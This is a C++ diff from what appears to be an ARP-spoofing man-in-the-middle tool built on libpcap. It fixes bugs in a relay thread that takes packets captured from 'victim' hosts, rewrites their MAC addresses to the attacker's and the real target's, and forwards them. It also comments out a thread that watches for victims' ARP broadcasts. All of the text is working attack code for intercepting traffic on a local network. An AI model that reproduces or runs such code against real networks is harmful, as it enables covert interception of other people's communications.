@@ -85,18 +85,20 @@ void release_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int fl
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			exit(-1);
 		}
+		printf("Release: FIND\n");
 		memcpy(&newpacket, packet, sizeof(EthIpPacket));
 		for(int i =0;i<flow;i++)
 		{
-			if(newpacket.eth_.type() == EthHdr::Ip4 && newpacket.ipv4_hdr.ip_dest() == victim[i].target_ip && newpacket.ipv4_hdr.ip_src() == victim[i].sender_ip)
+			if(newpacket.eth_.type() == EthHdr::Ip4 && newpacket.ipv4_.ipdst() == victim[i].target_ip && newpacket.ipv4_.ipsrc() == victim[i].sender_ip)
 			{
-				int size = sizeof(EthHdr) + newpacket.ipv4_hdr.ip_len();
-				u_char* fakepacket = new u_char[sizeof(u_char*size)];
+				printf("Release: send all packet from target and sender\n");
+				int size = sizeof(EthHdr) + newpacket.ipv4_.iplen();
+				u_char* fakepacket = new u_char[sizeof(u_char)*size];
 
 				newpacket.eth_.smac_ = attacker->mac;
 				newpacket.eth_.dmac_ = victim[i].target_mac;
 				
-				memcpy(fakepacket, packet, packet_size);
+				memcpy(fakepacket, packet, size);
 				memcpy(fakepacket, &newpacket, sizeof(EthIpPacket));
 
 				int res = pcap_sendpacket(handle, reinterpret_cast<const u_char *>(fakepacket), size);
@@ -110,6 +112,7 @@ void release_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int fl
 	}
 }
 
+/*
 void catch_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow)
 {
 	int res;
@@ -126,10 +129,11 @@ void catch_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			exit(-1);
 		}
+		printf("Catch: FIND\n");
 		memcpy(&newpacket, packet, sizeof(EthArpPacket));
         if(newpacket.eth_.type() == EthHdr::Arp && newpacket.arp_.pro() == EthHdr::Ip4)
 		{
-			if((newpacket.arp_.tmac()).isBroadCast())
+			if((newpacket.arp_.tmac()).isBroadcast())
 			{
 				printf("Catch: FIND Broadcast!! Is it victim?\n");
 				for(int i = 0;i<flow;i++)
@@ -149,3 +153,4 @@ void catch_thread(pcap_t* handle, Attackerinfo* attacker, Node* victim, int flow
 		}
 	}
 }
+*/
